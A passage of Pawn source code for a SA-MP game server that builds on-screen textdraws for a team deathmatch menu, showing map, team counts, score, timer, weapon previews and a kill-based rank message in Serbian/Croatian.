		PlayerTextDrawTextSize(playerid, tdm_player_tds[playerid][14], 7.000000, 10.000000);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][14], 1);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][14], -1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][14], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][14], 0);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][14], 255);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][14], 4);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][14], 0);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][14], 0);
		PlayerTextDrawSetSelectable(playerid, tdm_player_tds[playerid][14], true);

		tdm_player_tds[playerid][15] = CreatePlayerTextDraw(playerid, 270.173950, 231.833648, "box");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][15], 0.000000, 5.818017);
		PlayerTextDrawTextSize(playerid, tdm_player_tds[playerid][15], 315.260253, 0.000000);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][15], 1);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][15], -1);
		PlayerTextDrawUseBox(playerid, tdm_player_tds[playerid][15], 1);
		PlayerTextDrawBoxColor(playerid, tdm_player_tds[playerid][15], 100);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][15], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][15], 0);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][15], 255);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][15], 1);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][15], 1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][15], 0);

		tdm_player_tds[playerid][16] = CreatePlayerTextDraw(playerid, 292.711120, 229.700027, "oruzja:");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][16], 0.154963, 0.841665);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][16], 2);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][16], -1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][16], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][16], 1);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][16], 255);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][16], 2);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][16], 1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][16], 0);

		tdm_player_tds[playerid][17] = CreatePlayerTextDraw(playerid, 269.194671, 238.067413, "");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][17], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, tdm_player_tds[playerid][17], 23.000000, 23.000000);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][17], 1);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][17], -1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][17], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][17], 0);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][17], 100);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][17], 5);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][17], 0);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][17], 0);
		PlayerTextDrawSetPreviewModel(playerid, tdm_player_tds[playerid][17], 348);
		PlayerTextDrawSetPreviewRot(playerid, tdm_player_tds[playerid][17], 0.000000, 0.000000, 75.000000, 2.000000);

		tdm_player_tds[playerid][18] = CreatePlayerTextDraw(playerid, 293.085235, 238.217330, "");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][18], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, tdm_player_tds[playerid][18], 23.000000, 23.000000);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][18], 1);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][18], -1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][18], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][18], 0);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][18], 100);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][18], 5);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][18], 0);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][18], 0);
		PlayerTextDrawSetPreviewModel(playerid, tdm_player_tds[playerid][18], 349);
		PlayerTextDrawSetPreviewRot(playerid, tdm_player_tds[playerid][18], 0.000000, 0.000000, 75.000000, 2.000000);

		tdm_player_tds[playerid][19] = CreatePlayerTextDraw(playerid, 268.957733, 262.299957, "");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][19], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, tdm_player_tds[playerid][19], 23.000000, 23.000000);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][19], 1);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][19], -1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][19], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][19], 0);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][19], 100);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][19], 5);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][19], 0);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][19], 0);
		PlayerTextDrawSetPreviewModel(playerid, tdm_player_tds[playerid][19], 353);
		PlayerTextDrawSetPreviewRot(playerid, tdm_player_tds[playerid][19], 0.000000, 0.000000, 75.000000, 2.000000);

		tdm_player_tds[playerid][20] = CreatePlayerTextDraw(playerid, 293.185394, 262.283264, "");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][20], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, tdm_player_tds[playerid][20], 23.000000, 23.000000);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][20], 1);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][20], -1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][20], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][20], 0);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][20], 100);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][20], 5);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][20], 0);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][20], 0);
		PlayerTextDrawSetPreviewModel(playerid, tdm_player_tds[playerid][20], 356);
		PlayerTextDrawSetPreviewRot(playerid, tdm_player_tds[playerid][20], 0.000000, 0.000000, 75.000000, 2.000000);

		tdm_player_tds[playerid][21] = CreatePlayerTextDraw(playerid, 192.747573, 290.050079, "box");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][21], 0.000000, 3.504554);
		PlayerTextDrawTextSize(playerid, tdm_player_tds[playerid][21], 260.080078, 0.000000);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][21], 1);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][21], -1);
		PlayerTextDrawUseBox(playerid, tdm_player_tds[playerid][21], 1);
		PlayerTextDrawBoxColor(playerid, tdm_player_tds[playerid][21], 100);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][21], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][21], 0);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][21], 255);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][21], 1);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][21], 1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][21], 0);

		format(globalstring, 40, "~w~map:_~y~%s", tdm_mapInfo[ tdm_ServerMap ][ mName ]);
		tdm_player_tds[playerid][22] = CreatePlayerTextDraw(playerid, 225.849578, 289.166687, globalstring);
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][22], 0.153089, 0.719165);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][22], 2);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][22], -1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][22], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][22], 1);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][22], 255);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][22], 2);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][22], 1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][22], 0);

		tdm_player_tds[playerid][23] = CreatePlayerTextDraw(playerid, 225.849578, 296.983459, "~b~CT_~w~vs_~r~TT");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][23], 0.153089, 0.719165);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][23], 2);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][23], -1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][23], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][23], 1);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][23], 255);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][23], 2);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][23], 1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][23], 0);

		format(globalstring, 40, "~b~%d_~w~vs_~r~%d", tdm_mapInfo[ tdm_ServerMap ][ ctPlayers ], tdm_mapInfo[ tdm_ServerMap ][ ttPlayers ]);
		tdm_player_tds[playerid][24] = CreatePlayerTextDraw(playerid, 225.849578, 303.183837, globalstring);
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][24], 0.153089, 0.719165);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][24], 2);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][24], -1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][24], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][24], 1);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][24], 255);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][24], 2);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][24], 1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][24], 0);

		format(globalstring, 30, "~b~%d_~w~:_~r~%d", tdm_mapInfo[ tdm_ServerMap ][ ctScore ], tdm_mapInfo[ tdm_ServerMap ][ ttScore ]);
		tdm_player_tds[playerid][25] = CreatePlayerTextDraw(playerid, 225.849578, 309.184204, globalstring);
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][25], 0.153089, 0.719165);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][25], 2);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][25], -1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][25], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][25], 1);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][25], 255);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][25], 2);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][25], 1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][25], 0);

		format(globalstring, 40, "::_mec:_~y~%s%d:%s%d_~w~::", ((15*60000/60000 - tdm_mapInfo[ tdm_ServerMap ][ mMinut ]) < 10 ) ? ("0") : (""), (15*60000/60000 - tdm_mapInfo[ tdm_ServerMap ][ mMinut ]), ((15*60000/15000 - tdm_mapInfo[ tdm_ServerMap ][ mSekunda ]) < 10 ) ? ("0") : (""), (15*60000/15000 - tdm_mapInfo[ tdm_ServerMap ][ mSekunda ]));
		tdm_player_tds[playerid][26] = CreatePlayerTextDraw(playerid, 225.949584, 315.784606, globalstring);
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][26], 0.153089, 0.719165);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][26], 2);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][26], -1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][26], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][26], 1);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][26], 255);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][26], 2);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][26], 1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][26], 0);

		tdm_player_tds[playerid][27] = CreatePlayerTextDraw(playerid, 266.842346, 290.333343, "box");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][27], 0.000000, 2.128844);
		PlayerTextDrawTextSize(playerid, tdm_player_tds[playerid][27], 318.000000, 0.000000);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][27], 1);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][27], -1);
		PlayerTextDrawUseBox(playerid, tdm_player_tds[playerid][27], 1);
		PlayerTextDrawBoxColor(playerid, tdm_player_tds[playerid][27], 100);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][27], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][27], 0);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][27], 255);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][27], 1);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][27], 1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][27], 0);

		tdm_player_tds[playerid][28] = CreatePlayerTextDraw(playerid, 266.942352, 289.666717, "Ukoliko_ste_izabrali~n~tim,_kliknite_ispod_na~n~box_'JOIN_SERVER'.");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][28], 0.138096, 0.719165);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][28], 1);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][28], -1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][28], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][28], 1);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][28], 255);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][28], 1);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][28], 1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][28], 0);

		tdm_player_tds[playerid][29] = CreatePlayerTextDraw(playerid, 266.910827, 315.416625, "box");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][29], 0.000000, 0.816985);
		PlayerTextDrawTextSize(playerid, tdm_player_tds[playerid][29], 318.000000, 0.000000);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][29], 1);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][29], -1);
		PlayerTextDrawUseBox(playerid, tdm_player_tds[playerid][29], 1);
		PlayerTextDrawBoxColor(playerid, tdm_player_tds[playerid][29], 1619146495);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][29], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][29], 0);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][29], 255);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][29], 1);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][29], 1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][29], 0);

		tdm_player_tds[playerid][30] = CreatePlayerTextDraw(playerid, 292.242614, 314.049957, "JOIN_SERVER");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][30], 0.189631, 0.946666);
		PlayerTextDrawTextSize(playerid, tdm_player_tds[playerid][30], 10.000000, 10.000000);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][30], 2);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][30], -1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][30], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][30], 1);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][30], 255);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][30], 2);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][30], 1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][30], 0);
		PlayerTextDrawSetSelectable(playerid, tdm_player_tds[playerid][30], true);

		tdm_player_tds[playerid][31] = CreatePlayerTextDraw(playerid, 325.075897, 275.884277, "box");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][31], 0.000000, -0.286172);
		PlayerTextDrawTextSize(playerid, tdm_player_tds[playerid][31], 460.140136, 0.000000);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][31], 1);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][31], -1);
		PlayerTextDrawUseBox(playerid, tdm_player_tds[playerid][31], 1);
		PlayerTextDrawBoxColor(playerid, tdm_player_tds[playerid][31], 1619146495);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][31], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][31], 0);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][31], 255);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][31], 1);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][31], 1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][31], 0);

		tdm_player_tds[playerid][32] = CreatePlayerTextDraw(playerid, 319.148406, 269.316650, "ld_beat:chit");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][32], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, tdm_player_tds[playerid][32], 8.000000, 10.000000);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][32], 1);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][32], 1619146495);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][32], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][32], 0);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][32], 255);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][32], 4);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][32], 0);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][32], 0);

		tdm_player_tds[playerid][33] = CreatePlayerTextDraw(playerid, 394.217346, 197.816757, "DeathMatch(unlimited)");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][33], 0.179793, 0.894164);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][33], 2);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][33], -1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][33], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][33], 1);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][33], 255);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][33], 2);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][33], 1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][33], 0);

		tdm_player_tds[playerid][34] = CreatePlayerTextDraw(playerid, 330.566802, 211.583358, "box");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][34], 0.000000, 2.009285);
		PlayerTextDrawTextSize(playerid, tdm_player_tds[playerid][34], 454.000000, 0.000000);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][34], 1);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][34], -1);
		PlayerTextDrawUseBox(playerid, tdm_player_tds[playerid][34], 1);
		PlayerTextDrawBoxColor(playerid, tdm_player_tds[playerid][34], 100);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][34], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][34], 0);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][34], 255);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][34], 1);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][34], 1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][34], 0);

        if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 4500 ) format(globalstring, 150, "Vas_rank_na_ovom_DM_serveru:_10/10~n~Svaki_rank_nosi_drugacija_oruzja_i_svaki_rank~n~ima_drugacije_skill-ove_za_oruzje.");
		else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 4000 ) format(globalstring, 150, "Vas_rank_na_ovom_DM_serveru:_9/10~n~Svaki_rank_nosi_drugacija_oruzja_i_svaki_rank~n~ima_drugacije_skill-ove_za_oruzje.");
		else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 3500 ) format(globalstring, 150, "Vas_rank_na_ovom_DM_serveru:_8/10~n~Svaki_rank_nosi_drugacija_oruzja_i_svaki_rank~n~ima_drugacije_skill-ove_za_oruzje.");
		else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 3000 ) format(globalstring, 150, "Vas_rank_na_ovom_DM_serveru:_7/10~n~Svaki_rank_nosi_drugacija_oruzja_i_svaki_rank~n~ima_drugacije_skill-ove_za_oruzje.");
		else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 2500 ) format(globalstring, 150, "Vas_rank_na_ovom_DM_serveru:_6/10~n~Svaki_rank_nosi_drugacija_oruzja_i_svaki_rank~n~ima_drugacije_skill-ove_za_oruzje.");
		else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 2000 ) format(globalstring, 150, "Vas_rank_na_ovom_DM_serveru:_5/10~n~Svaki_rank_nosi_drugacija_oruzja_i_svaki_rank~n~ima_drugacije_skill-ove_za_oruzje.");
		else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 1500 ) format(globalstring, 150, "Vas_rank_na_ovom_DM_serveru:_4/10~n~Svaki_rank_nosi_drugacija_oruzja_i_svaki_rank~n~ima_drugacije_skill-ove_za_oruzje.");
		else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 1000 ) format(globalstring, 150, "Vas_rank_na_ovom_DM_serveru:_3/10~n~Svaki_rank_nosi_drugacija_oruzja_i_svaki_rank~n~ima_drugacije_skill-ove_za_oruzje.");
		else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 500 ) format(globalstring, 150, "Vas_rank_na_ovom_DM_serveru:_2/10~n~Svaki_rank_nosi_drugacija_oruzja_i_svaki_rank~n~ima_drugacije_skill-ove_za_oruzje.");
		else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 0 ) format(globalstring, 150, "Vas_rank_na_ovom_DM_serveru:_1/10~n~Svaki_rank_nosi_drugacija_oruzja_i_svaki_rank~n~ima_drugacije_skill-ove_za_oruzje.");
		tdm_player_tds[playerid][35] = CreatePlayerTextDraw(playerid, 332.066925, 210.799972, globalstring);
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][35], 0.149340, 0.678331);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][35], 1);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][35], -1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][35], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][35], 1);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][35], 255);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][35], 1);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][35], 1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][35], 0);

		tdm_player_tds[playerid][36] = CreatePlayerTextDraw(playerid, 330.592803, 235.083282, "box");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][36], 0.000000, 2.353104);
		PlayerTextDrawTextSize(playerid, tdm_player_tds[playerid][36], 454.000000, 0.000000);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][36], 1);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][36], -1);
		PlayerTextDrawUseBox(playerid, tdm_player_tds[playerid][36], 1);
		PlayerTextDrawBoxColor(playerid, tdm_player_tds[playerid][36], 100);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][36], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][36], 0);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][36], 255);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][36], 1);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][36], 1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][36], 0);

		tdm_player_tds[playerid][37] = CreatePlayerTextDraw(playerid, 339.494995, 234.733581, "");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][37], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, tdm_player_tds[playerid][37], 19.000000, 22.000000);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][37], 1);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][37], -1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][37], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][37], 0);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][37], 100);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][37], 5);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][37], 0);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][37], 0);
		PlayerTextDrawSetPreviewModel(playerid, tdm_player_tds[playerid][37], 348);
		PlayerTextDrawSetPreviewRot(playerid, tdm_player_tds[playerid][37], 0.000000, 0.000000, 75.000000, 2.000000);

		tdm_player_tds[playerid][38] = CreatePlayerTextDraw(playerid, 367.874938, 234.816864, "");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][38], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, tdm_player_tds[playerid][38], 19.000000, 22.000000);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][38], 1);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][38], -1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][38], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][38], 0);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][38], 100);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][38], 5);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][38], 0);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][38], 0);
		if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 0 && PlayerInfo[ playerid ][ xDMEventUbistva ] < 2000 ) PlayerTextDrawSetPreviewModel(playerid, tdm_player_tds[playerid][38], 349);
		else if( ( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 2000 && PlayerInfo[ playerid ][ xDMEventUbistva ] < 3000 ) || PlayerInfo[ playerid ][ xDMEventUbistva ] >= 4500 ) PlayerTextDrawSetPreviewModel(playerid, tdm_player_tds[playerid][38], 350);
		else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 3000 && PlayerInfo[ playerid ][ xDMEventUbistva ] < 4500 ) PlayerTextDrawSetPreviewModel(playerid, tdm_player_tds[playerid][38], 351);
		PlayerTextDrawSetPreviewRot(playerid, tdm_player_tds[playerid][38], 0.000000, 0.000000, 75.000000, 2.000000);

		tdm_player_tds[playerid][39] = CreatePlayerTextDraw(playerid, 396.828674, 234.816864, "");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][39], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, tdm_player_tds[playerid][39], 19.000000, 22.000000);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][39], 1);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][39], -1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][39], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][39], 0);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][39], 100);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][39], 5);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][39], 0);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][39], 0);
		if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 500 && PlayerInfo[ playerid ][ xDMEventUbistva ] < 3000 ) PlayerTextDrawSetPreviewModel(playerid, tdm_player_tds[playerid][39], 353);
		else if( ( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 3500 && PlayerInfo[ playerid ][ xDMEventUbistva ] < 4000 ) || PlayerInfo[ playerid ][ xDMEventUbistva ] >= 4500 ) PlayerTextDrawSetPreviewModel(playerid, tdm_player_tds[playerid][39], 352);
